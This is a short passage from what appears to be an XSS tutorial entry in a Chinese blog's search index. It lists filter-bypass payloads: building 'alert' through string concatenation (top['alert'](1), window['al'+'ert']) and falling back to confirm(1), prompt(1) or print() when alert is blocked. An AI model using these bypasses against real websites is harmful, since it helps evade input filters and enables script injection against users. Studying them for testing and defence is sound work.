关键字被滤
字符串拼接 alert、top[&#39;alert&#39;](1)、window[&#39;al&#39;+&#39;ert&#39;]


alert 被滤
confirm(1)、prompt(1)、print()


]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>跨站脚本</tag>
      </tags>
  </entry>
</search>
